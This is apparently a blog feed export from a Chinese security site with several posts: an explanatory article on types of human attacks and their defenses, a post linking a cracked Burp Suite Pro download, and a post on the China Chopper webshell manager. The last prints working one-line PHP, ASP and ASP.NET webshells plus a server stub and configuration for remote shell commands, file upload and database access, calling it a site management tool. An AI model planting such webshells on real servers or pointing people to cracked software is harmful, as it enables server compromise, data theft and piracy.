alt="信息安全职业群岗位.jpg"></p><h2 id="0x02-PDF格式"><a href="#0x02-PDF格式" class="headerlink" title="0x02 PDF格式"></a>0x02 PDF格式</h2><p><a href="https://github.com/4ido10n/information-security-occupational-group-mind-map" target="_blank" rel="external">https://github.com/4ido10n/information-security-occupational-group-mind-map</a></p>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 信息安全甲方乙方 </tag>
            
            <tag> 信息安全职业群岗位脑图 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浅谈安全性攻击人为攻击的主要形式和防御]]></title>
      <url>/2016/07/03/%E6%B5%85%E8%B0%88%E5%AE%89%E5%85%A8%E6%80%A7%E6%94%BB%E5%87%BB%E4%BA%BA%E4%B8%BA%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%BB%E8%A6%81%E5%BD%A2%E5%BC%8F%E5%92%8C%E9%98%B2%E5%BE%A1/</url>
      <content type="html"><![CDATA[<h2 id="0x01-安全性攻击主要的两种方式"><a href="#0x01-安全性攻击主要的两种方式" class="headerlink" title="0x01 安全性攻击主要的两种方式"></a>0x01 安全性攻击主要的两种方式</h2><p>当前，对信息系统(包括硬件、软件、数据、人、物理环境及其基础设施)的攻击来自多方面，这些攻击我们可以宏观地分为人为攻击(主观因素)和自然灾害攻击(客观因素)，这两大类的攻击都会对信息安全构成威胁。造成自然灾害攻击的自然因素包括各种自然灾害：如水、火、雷、电、风暴、烟尘、虫害、鼠害、海啸和地震等；系统的环境和场地条件，如温度、湿度、电源、地线和其他防护设施不良造成的威胁；电磁辐射和电磁干扰的威胁；硬件设备自然老化，可靠性下降的威胁等。因为自然灾害往往不可预知和抗力，所以自然灾害发生而造成的攻击通常是不可避免的。虽然自然灾害攻击通常不可预知，但是我们可以做一些防患于未然的措施，比如根据信息系统的重要性对其所处的地方进行自然灾害的预测与报警，根据信息系统所处环境的情况进行隔离保护等。不过往往信息安全安全性攻击的方式主要以的是人为攻击的形式出现，因为精心设计的人为攻击威胁较大，灵活多变而难于防御，所以在这里我们主要讨论人为攻击方式。</p><h2 id="0x02-安全性攻击人为攻击"><a href="#0x02-安全性攻击人为攻击" class="headerlink" title="0x02 安全性攻击人为攻击"></a>0x02 安全性攻击人为攻击</h2><p>一般而言，人为攻击都是通过寻找系统的弱点，以非授权的方式达到破坏、欺骗和窃取数据信息等目的。由于人为攻击运用的方式往往非常灵活，所以导致人为攻击方法没有规范的分类模式，从攻击的目的来看，可以有拒绝服务攻击(Dos)、获取系统权限的攻击、获取敏感信息的攻击；从攻击的切入点来看，有缓冲区溢出攻击、系统设置漏洞的攻击等；从攻击的纵向实施过程来看，又有获取初级权限攻击、提升最高权限的攻击、后门攻击、跳板攻击等；从攻击的类型来看，包括对各种操作系统的攻击、对网络设备的攻击、对特定应用系统的攻击等。所以说，很难以一个统一的模式对各种攻击手段进行分类，采用不同的分类标准(如攻击手段、攻击目标等)我们可以将攻击形式分为不同的分类，这里我们参照美国国家标准局在2000年9月发布的《信息保障技术框架(IATF) 3.0》版本里的给出的参考，《信息保障技术框架(IATF) 3.0》中将攻击形式大致分为被动攻击、主动攻击、物理临近攻击、内部人员攻击和软硬件配装攻击等5类。</p><a id="more"></a><h2 id="0x03-安全性攻击人为攻击分类"><a href="#0x03-安全性攻击人为攻击分类" class="headerlink" title="0x03 安全性攻击人为攻击分类"></a>0x03 安全性攻击人为攻击分类</h2><p><strong>(1) 被动攻击</strong></p><p>被动攻击是指在未经用户同意和认可的情况下攻击者嗅探窃听获得信息或数据文件并对其分析，但不对数据信息做任何修改。通常被动攻击包括监听未受保护的通信信息，流量分析，破解弱加密的数据流、敏感信息被动方式收集、获得认证信息(如用户账号和密码等)。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/07/3590160595.jpg" alt="被动攻击.jpg"></p><p>其中，流量分析的情况比较微妙，现在甲乙两者通过某种加密手段进行通信，如加密屏蔽了信息内容或其他通信量，使得攻击者从截获的消息中无法获得信息的真实内容，但攻击者还能通过观察分析这些数据包的格式或模式，分析通信双方的位置，通信的次数及信息长度等，而这些信息可能对甲乙双者来说是非常敏感的。</p><p>网络监听通常的目的是实现数据窃听，比如获取用户账号和密码等，如在telnet、ftp、http、smtp等传输协议中，用户帐户和密码信息都是以明文格式传输的。网络监听是通过一种监视网络状态、数据流程以及网络上信息传输的管理工具实现，它可以将网络界面设定成监听模式，并且可以截获网络上所传输的信息，但是网络监听只能应用于连接同一网段的主机。至于实现的工具有很多，比如著名的Sniffer监听工具。</p><p>访问控制是网络安全保护和防范的核心策略之一，非法访问会造成网络资源和信息的泄露。防止非法访问可以通过多种访问控制技术来实现，当然访问控制技术所涉及内容较为广泛，通过包括网络登录控制、网络资源使用权限控制、目录文件权限控制，以及属性安全控制等多种手段。</p><p>信息收集是指通过各种方式获取所需要的信息,为了更加有效地实施攻击而在攻击前或攻击过程中对目标主机的所有探测活动。信息收集分为被动式信息收集和主动式信息收集，被动式信息收集是利用第三方的服务对目标进行访问了解，具有基于公开渠道、与目标不直接接触、隐蔽性较好的特，常见的被动信息收集的方式有Google Hacking，DNS分析，whois查询，Shodan查询、ZoomEye Hacking等，一般在一个渗透测试项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。</p><p>被动攻击一般不易被发现，是主动攻击的前期阶段。此外，由于被动攻击不会对被动攻击对象做任何修改，留下的痕迹较少或根本没有留下任何痕迹，因而非常难以检测，所以抗击被动攻击的重点在于预防，具体的措施包括VPN(虚拟专用网络)、采用加密技术保护网络及使用加密保护的分布式网络等。</p><p><strong>(2) 主动攻击</strong></p><p>主动攻击是指攻击者通过有选择的修改、删除、延迟、乱序、复制、插入数据流或数据流的一部分以达到其非法目的，主动攻击主要涉及某些数据流的篡改或虚假数据流的产生，可能改变信息或危害系统，威胁信息完整性，可用性、真实性和有效性。主动攻击通常易于探测但却难于防范，因为攻击者可以通过多种方式发起，常分为中断、伪造、篡改等。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/06/2923312981.jpg" alt="主动攻击.jpg"></p><p>中断是指阻断由发送方到接收方的信息流，使接收方无法得到该信息，这是针对信息可用性的攻击。中断攻击方式主要体现为拒绝服务攻击，拒绝服务是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象，拒绝服务按其攻击原理分为多种类型，如：SYN Flood、UDP flood等，而分布式拒绝服务攻击是在传统的拒绝服务攻击基础之上产生的一类攻击方式，指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动拒绝服务攻击，从而成倍地提高拒绝服务攻击的威力。</p><p>篡改是指攻击者修改、破坏由发送方到接收方的信息流，使接收方得到错误的信息，从而破坏信息的完整性。比较出名的例子如VOIP Hacking，在通信会话中插入、修改和删除VoIP包的中间人攻击。</p><p>伪造是针对信息的真实性的攻击，攻击者或者是首先记录一段发送方与接收方之间的信息流，然后在适当时间向接收方或发送方重放这段信息，或者是完全伪造一段信息流，冒充接收方可信任的第三方。广义上的伪造具体表现的攻击形式有多种如跨站请求伪造（CSRF）、服务器端请求伪造(SSRF)等。</p><p>主动攻击的特点与被动攻击恰好相反，被动攻击虽然难于检测，但可以采用有效的防御策略，而要绝对防止主动攻击是十分困难的。因而应对主动攻击的主要途径是检测，以及能从此攻击造成的破坏中及时地恢复，同时入侵检测系统或工具还具有某种遏制效果，在一定程度上也能起到防止攻击扩大的作用，具体的措施包括入侵检测、安全审计和完整性恢复等。</p><p><strong>(3) 物理临近攻击</strong></p><p>物理临近攻击是指未授权人以更改、收集或拒绝访问为目的而物理接近网络系统或设备。广义上的物理层次攻击也是现在发展的趋势，表现形式有旁信道攻击，智能家居系统入侵，汽车控制系统入侵，工业控制系统入侵。比如众所周知的震网病毒事件就是典型的工业控制系统入侵事件。</p><p>物理层面攻击步骤十分复杂，比如攻击者需要首先获取传感器的度数，操控发送到控制器的参数，最后将指令发送到执行设备上完整流程。实现物理层次攻击通常要求攻击者了解攻击目标的物理结构，具有大量的目标物理构成原理基础知识，具备设施工作原理的知识，更深层次要求攻击者了解目标设施的工程实现文档，了解目标设施的动态行为，以及其工作流程中的每个细节。下图给出了物理攻击一般步骤：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/07/3660759258.jpg" alt="物理攻击步骤.jpg"></p><p><strong>(4) 内部人员攻击</strong></p><p>内部人员攻击分为恶意的和非恶意的，来自IBM的一个专门做安全的研究团队X-Force，一直在做着全球范围安全情报信息收集和分析工作，根据X-Force二季度报告发现，55%的攻击来自内部人员，其中恶意行为占31.5%，疏忽大意导致的占23.5%。通常内部人员知道系统的布局、有价值的数据存放在什么地方及和何种防御工具在运行，所以他们往往能指定针对性的恶意攻击计划实施攻击行为。比较出名的事件索尼被内部人员攻击。</p><p>恶意攻击是指内部人员有计划地窃听或损坏信息或拒绝其他授权用户的访问，非恶意攻击则通常是由于粗心、缺乏技术知识或为了”完成工作”等无意间绕过安全策略但对系统产了破坏行为的情况，无目的事件包括：操作失误（操作不当、误用媒体、设置错误）、意外损失（电力线搭接、电火花干扰）、编程缺陷（经验不足、检查漏项、不兼容文件）、意外丢失（被盗、被非法复制、丢失媒体）、管理不善（维护不利、管理松驰）、无意破坏（无意损坏、意外删除等）。</p><p>内部人员攻击造成的危害不可小觑，应该制定相应的安全策略防御内部人员攻击，具体的措施包括实施一套专用的数据泄漏保护(DLP)设备或软件，配置防火墙，使用网络内的数据包检查，使用带有内容过滤，安全检测功能的邮件安全产品、控制内部人员USB设备使用、内部人员变更，身份以及权限管理、提升内部人员安全意识等。</p><p><strong>(5) 软硬件配装攻击</strong></p><p>软硬件配装攻击是指在软硬件生成的工厂内在在产品分发过程中恶意修改硬件或软件。这种攻击可能会给一个产品引入后门程序等恶意代码，以便日后在未授权的情况下访问所需的信息或系统。比较出名的Xcode事件就是因为开发者使用非苹果公司官方渠道的XCODE开发工具开发苹果APP，导致开发正常的苹果APP时会被植入恶意代码，从而导致开发的APP变成具有信息窃取，恶意远程控制功能的恶意程序。针对此事件我们应该养成不要从非官方渠道下载开发工具，下载软件之后进行Hash校验和比对的习惯。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>当然，在现实生活中一次成功的攻击过程可能会综合若干种攻击手段，在不同的入侵阶段使用不同的方法。通常是采用被动攻击手段来收集信息，指定攻击步骤和策略，然后通过主动攻击来达到目的。而我们所能做的就是采取措施保护信息资产，如及时发现并处理安全隐患、识别组织资产和风险、提升人员安全意识、采取恰当的策略和控制措施来消减风险，使信息资产不因偶然或者恶意侵犯而遭受破坏、更改及泄露，保证信息系统能够连续、可靠、正常的运行，使安全事件对业务造成的影响减到最小，确保组织业务运行的连续性。</p>]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 物理临近攻击 </tag>
            
            <tag> 被动攻击 </tag>
            
            <tag> 安全性攻击 </tag>
            
            <tag> 主动攻击 </tag>
            
            <tag> 内部人员攻击 </tag>
            
            <tag> 人为攻击 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[最新Burpsuite Pro v1.7.03 介绍和破解版下载]]></title>
      <url>/2016/06/25/%E6%9C%80%E6%96%B0Burpsuite-Pro-v1.7.03-%E4%BB%8B%E7%BB%8D%E5%92%8C%E7%A0%B4%E8%A7%A3%E7%89%88%E4%B8%8B%E8%BD%BD/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p><a id="more"></a><p><img src="https://www.hackfun.org/usr/uploads/2016/06/burpsuite%201.7.03.JPG" alt="burpsuite 1.7.03"></p><h2 id="0x01-特点："><a href="#0x01-特点：" class="headerlink" title="0x01 特点："></a>0x01 特点：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1.Target(目标)——显示目标目录结构的的一个功能</div><div class="line">2.Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</div><div class="line">3.Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</div><div class="line">4.Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。</div><div class="line">5.Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</div><div class="line">6.Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。</div><div class="line">7.Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</div><div class="line">8.Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。</div><div class="line">9.Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</div><div class="line">10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</div><div class="line">11.Options(设置)——对Burp Suite的一些设置</div></pre></td></tr></table></figure><h2 id="0x02-工作流程"><a href="#0x02-工作流程" class="headerlink" title="0x02 工作流程"></a>0x02 工作流程</h2><p><img src="https://www.hackfun.org/usr/uploads/2016/06/366930440.png" alt="Burpsuite Pro工作流程"></p><h2 id="0x02-下载"><a href="#0x02-下载" class="headerlink" title="0x02 下载"></a>0x02 下载</h2><p><a href="https://github.com/4ido10n/latest-Burpsuite-Pro-v1.7.03-cracked-version" target="_blank" rel="external">https://github.com/4ido10n/latest-Burpsuite-Pro-v1.7.03-cracked-version</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> bursuite pro cracked </tag>
            
            <tag> burpsuite pro v1.7.03 cracked </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[最新中国菜刀caidao-20160620下载和说明]]></title>
      <url>/2016/06/20/%E6%9C%80%E6%96%B0%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80caidao-20160620%E4%B8%8B%E8%BD%BD%E5%92%8C%E8%AF%B4%E6%98%8E/</url>
      <content type="html"><![CDATA[<h1 id="0x00-中国制造-黑客之刀"><a href="#0x00-中国制造-黑客之刀" class="headerlink" title="0x00 中国制造, 黑客之刀"></a>0x00 中国制造, 黑客之刀</h1><p>中国菜刀是中国安全圈内使用非常广泛的一款Webshell管理工具，此次老兵大牛进行了更新，界面更加优美，功能更加丰富，有图有真相！</p><a id="more"></a><p><img src="https://www.hackfun.org/usr/uploads/2016/06/%E6%9C%80%E6%96%B0%E8%8F%9C%E5%88%80%E9%A6%96%E9%A1%B5.JPG" alt="最新菜刀首页"></p><h1 id="0x01-验证"><a href="#0x01-验证" class="headerlink" title="0x01 验证"></a>0x01 验证</h1><p>此次更新还自带了官网验证功能，妈妈再也不会担心我的webshell了。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/06/%E8%8F%9C%E5%88%80%E9%AA%8C%E8%AF%81.JPG" alt="菜刀验证"></p><h1 id="0x02-软件说明"><a href="#0x02-软件说明" class="headerlink" title="0x02 软件说明"></a>0x02 软件说明</h1><h2 id="菜刀-Caidao-http-www-maicaidao-com"><a href="#菜刀-Caidao-http-www-maicaidao-com" class="headerlink" title="菜刀 / Caidao @ http://www.maicaidao.com/"></a>菜刀 / Caidao @ <a href="http://www.maicaidao.com/" target="_blank" rel="external">http://www.maicaidao.com/</a></h2><pre><code>菜刀，他是一款专业的网站管理工具
</code></pre><h2 id="一、网站管理模块"><a href="#一、网站管理模块" class="headerlink" title="一、网站管理模块"></a>一、网站管理模块</h2><h2 id="（1）放在网站上的脚本程序分两种"><a href="#（1）放在网站上的脚本程序分两种" class="headerlink" title="（1）放在网站上的脚本程序分两种"></a>（1）放在网站上的脚本程序分两种</h2><p><strong>1.1）“一句话(Eval)”：</strong></p><p>PHP, ASP, ASP.NET 的网站都可以，支持https。下面的代码放在网站目录即可开始管理，比FTP好用多了是不是：<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PHP:    <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'caidao'</span>]);<span class="meta">?&gt;</span></div><div class="line">ASP:    &lt;%<span class="keyword">eval</span> request(<span class="string">"caidao"</span>)%&gt;</div><div class="line">ASP.NET:    &lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"caidao"</span>],<span class="string">"unsafe"</span>);%&gt;</div></pre></td></tr></table></figure><p></p><p><strong>1.2）自己开发的脚本程序(Customize)：</strong></p><p>理论上支持所有动态脚本,只要正确与菜刀进行交互即可。调用方法请参阅后面的 “Customize模式菜刀和服务端通信接口”。</p><h2 id="（2）常用功能介绍"><a href="#（2）常用功能介绍" class="headerlink" title="（2）常用功能介绍"></a>（2）常用功能介绍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">2.1）文件管理：[特色]缓存下载目录，并支持离线查看缓存目录;</div><div class="line"></div><div class="line">2.2）虚拟终端：[特色]人性化的设计，操作方便;(输入HELP查看更多用法), 超长命令会分割为5k字节一份，分别提交。</div><div class="line"></div><div class="line">2.3）数据库管理：[特色]图形界面,支持MYSQL,MSSQL,ORACLE,INFOMIX,POSTGRESQL,ACCESS, 以及支持ADO方式连接的数据库。</div><div class="line"></div><div class="line">2.4) 自写脚本（只有Eval端才支持）：</div><div class="line"></div><div class="line">		通过简单编码后提交用户自己的脚本到服务端执行，实现丰富的功能，也可选择发送到浏览器执行。</div><div class="line"></div><div class="line">		如果要写自己的CCC脚本，可以参考一下CCC目录下的示例代码, 相信你也可以写出功能丰富的脚本。</div><div class="line"></div><div class="line">		可以在官网下载别人的CCC脚本，或分享你的得意之作。</div></pre></td></tr></table></figure><h2 id="（3）配置框填写说明"><a href="#（3）配置框填写说明" class="headerlink" title="（3）配置框填写说明"></a>（3）配置框填写说明</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div></pre></td><td class="code"><pre><div class="line">----------------</div><div class="line">A)  数据库相关：</div><div class="line">----------------</div><div class="line">PHP：</div><div class="line">&lt;T&gt;类型&lt;/T&gt; 类型可为MYSQL,MSSQL,ORACLE,INFOMIX,POSTGRESQL中的一种</div><div class="line">&lt;H&gt;主机地址&lt;H&gt; 主机地址可为机器名或IP地址，如localhost</div><div class="line">&lt;U&gt;数据库用户&lt;/U&gt; 连接数据库的用户名，如root</div><div class="line">&lt;P&gt;数据库密码&lt;/P&gt; 连接数据库的密码，如<span class="number">123455</span></div><div class="line">&lt;N&gt;默认库&lt;/N&gt; 默认连接的库名</div><div class="line"></div><div class="line">&lt;L&gt;utf8&lt;/L&gt; 这一项数据库类型为MYSQL脚本为PHP时可选，不填则为latin1</div><div class="line"></div><div class="line">ASP 和 ASP.NET：</div><div class="line">&lt;T&gt;类型&lt;/T&gt; 类型只能填ADO</div><div class="line">&lt;C&gt;ADO配置信息&lt;/C&gt;</div><div class="line">ADO连接各种数据库的方式不一样。如MSSQL的配置信息为</div><div class="line">	Driver=&#123;Sql Server&#125;;Server=(local);Database=master;Uid=sa;Pwd=<span class="number">123456</span>;</div><div class="line"></div><div class="line">Customize：</div><div class="line">&lt;T&gt;类型&lt;/T&gt; 类型只能填XDB</div><div class="line">&lt;X&gt;与Customize 脚本约定的配置信息&lt;/X&gt;</div><div class="line">菜刀自带的Customize.jsp数据库参数填写方法如下(两行)：</div><div class="line">MSSQL:</div><div class="line">	&lt;X&gt;</div><div class="line">	com.microsoft.sqlserver.jdbc.SQLServerDriver</div><div class="line">	jdbc:sqlserver:<span class="comment">//127.0.0.1:1433;databaseName=test;user=sa;password=123456</span></div><div class="line">	&lt;/X&gt;</div><div class="line">MYSQL:</div><div class="line">	&lt;X&gt;</div><div class="line">	com.mysql.jdbc.Driver</div><div class="line">	jdbc:mysql:<span class="comment">//localhost/test?user=root&amp;password=123456</span></div><div class="line">	&lt;/X&gt;</div><div class="line">ORACLE:</div><div class="line">	&lt;X&gt;</div><div class="line">	oracle.jdbc.driver.OracleDriver</div><div class="line">	jdbc:oracle:thin:user/password@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1521</span>/test</div><div class="line">	&lt;/X&gt;</div><div class="line"></div><div class="line">-------------</div><div class="line">B) 其它配置：</div><div class="line">-------------</div><div class="line"></div><div class="line">添加额外附加提交的数据，如ASP的新服务端是这样的：</div><div class="line">&lt;%</div><div class="line">Set o = Server.CreateObject(<span class="string">"ScriptControl"</span>)</div><div class="line">o.language = <span class="string">"vbscript"</span></div><div class="line">o.addcode(Request(<span class="string">"SC"</span>))</div><div class="line">o.run <span class="string">"ff"</span>,Server,Response,Request,Application,Session,Error</div><div class="line">%&gt;</div><div class="line">那么，菜刀在配置处填入：</div><div class="line">&lt;O&gt;SC=<span class="function"><span class="keyword">function</span>+<span class="title">ff</span><span class="params">(Server,Response,Request,Application,Session,Error)</span>:<span class="title">eval</span><span class="params">(request<span class="params">(<span class="string">"caidao"</span>)</span>)</span>:<span class="title">end</span>+<span class="title">function</span>&lt;/<span class="title">O</span>&gt;</span></div><div class="line"><span class="function">然后以密码<span class="title">caidao</span>来连接即可。</span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">默认终端程序路径设置示例：</span></div><div class="line"><span class="function">&lt;<span class="title">SHELL</span>&gt;/<span class="title">bin</span>/<span class="title">sh</span>&lt;/<span class="title">SHELL</span>&gt;</span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">虚拟终端默认命令设置示例：</span></div><div class="line"><span class="function">&lt;<span class="title">CMD</span>&gt;<span class="title">whoami</span>&lt;/<span class="title">CMD</span>&gt;</span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">文件管理默认打开的目录设置示例：</span></div><div class="line"><span class="function">&lt;<span class="title">CD</span>&gt;<span class="title">c</span>:\<span class="title">windows</span>\<span class="title">temp</span>\&lt;/<span class="title">CD</span>&gt;</span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">　　如果你网站开通了<span class="title">HTTP</span>登录验证，可以这样填地址：</span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"><span class="title">http</span>://<span class="title">user</span>:<span class="title">pass</span>@<span class="title">maicaidao</span>.<span class="title">com</span>/<span class="title">admin</span>.<span class="title">asp</span></span></div><div class="line"><span class="function">用户名密码中的特殊字符可用<span class="title">URL</span>编码转换。</span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">   【20160620后的版本多了个文件<span class="title">caidao</span>.<span class="title">conf</span>】</span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">    这个文件是必须有的，里面的各节点一个也不能删，不然程序运行会出错！</span></div><div class="line"><span class="function">    默认调用的是<span class="title">caidao</span>.<span class="title">conf</span>，菜单里有个“加载配置文件”的菜单项，可以切换配置文件。</span></div><div class="line"><span class="function">    这个文件必段存为<span class="title">UNICODE</span>编码！</span></div><div class="line"><span class="function">    各节点简单介绍一下：</span></div><div class="line"><span class="function">&lt;<span class="title">FLAG</span>&gt;	返回的内容分隔符，只限三个字符，用生辟点的字符吧。</span></div><div class="line"><span class="function">&lt;<span class="title">UA</span>&gt;	自定义<span class="title">User</span>-<span class="title">Agent</span>的值</span></div><div class="line"><span class="function">&lt;<span class="title">K1</span>&gt;	<span class="title">POST</span>的第一个参数名称，不再是原版本固定的<span class="title">z1</span></span></div><div class="line"><span class="function">&lt;<span class="title">K2</span>&gt;	同上</span></div><div class="line"><span class="function"></span></div><div class="line">&lt;PHP_BASE&gt;	这是PHP脚本的基本代码，其它的功能代码最终会传到这里面，注意里面的%s %d这样的参数</div><div class="line">&lt;ASP_BASE&gt;	同上</div><div class="line">&lt;ASPX_BASE&gt;	同上</div><div class="line">&lt;PHP_BASE.加密示例&gt;	这个不会用到，如果临时复制出来一个节点，可以取一个不同的节点名字，不要重名了。</div><div class="line">	这里示范的是如何把PHP_BASE的内容加密发送。</div><div class="line">	相信你会做得更好。</div><div class="line">&lt;GETBASEINFO&gt;</div><div class="line">&lt;SHOWFOLDER&gt;</div><div class="line">&lt;SHOWTXTFILE&gt;</div><div class="line">&lt;SAVETXTFILE&gt;</div><div class="line">&lt;DELETEFILE&gt;</div><div class="line">&lt;DOWNFILE&gt;</div><div class="line">&lt;UPLOADFILE&gt;</div><div class="line">&lt;PASTEFILE&gt;</div><div class="line">&lt;NEWFOLDER&gt;</div><div class="line">&lt;WGET&gt;</div><div class="line">&lt;SHELL&gt;</div><div class="line">&lt;RENAME&gt;</div><div class="line">&lt;SETTIME&gt;</div><div class="line">-----------上面这些，你懂的，就不费篇幅了</div><div class="line">&lt;DB_PHP_MYSQL_DBLIST&gt;		PHP脚本刚连接时调用这里，给出库列表</div><div class="line">&lt;DB_PHP_MYSQL_TABLELIST&gt;	点击库调用，显示数据表</div><div class="line">&lt;DB_PHP_MYSQL_COLUMNLIST&gt;	点击数据表调用，显示数据表字段</div><div class="line">&lt;DB_PHP_MYSQL_EXECUTESQL&gt;	执行SQL，分别处理查询和执行并给出结果。</div><div class="line">....</div><div class="line">接下来的几样都是PHP连其它库的，大同小异。</div><div class="line">&lt;DB_ASP_ADO_DBLIST&gt;</div><div class="line">&lt;DB_ASP_ADO_TABLELIST&gt;</div><div class="line">&lt;DB_ASP_ADO_COLUMNLIST&gt;</div><div class="line">&lt;DB_ASP_ADO_EXECUTESQL&gt;</div><div class="line">上面是ASP管理数据库的脚本，用ADO来整的。</div><div class="line">&lt;DB_ASPX_ADO_DBLIST&gt;</div><div class="line">&lt;DB_ASPX_ADO_TABLELIST&gt;</div><div class="line">&lt;DB_ASPX_ADO_COLUMNLIST&gt;</div><div class="line">&lt;DB_ASPX_ADO_EXECUTESQL&gt;</div><div class="line">ASPX的，当然还有其它好用的方式，看你的习惯来改了。</div></pre></td></tr></table></figure><h1 id="二、记事本"><a href="#二、记事本" class="headerlink" title="二、记事本"></a>二、记事本</h1><pre><code>忽然觉得有个地方记录点东西还是挺方便的。
</code></pre><h1 id="三、浏览器"><a href="#三、浏览器" class="headerlink" title="三、浏览器"></a>三、浏览器</h1><pre><code>就是一个专用的网页浏览器，
Post浏览/自定义Cookies,/执行自定义脚本/自动刷新页面/同IP网页搜索。
如果有ip.dat库，在状态栏会显示此网站的IP,国家代码。
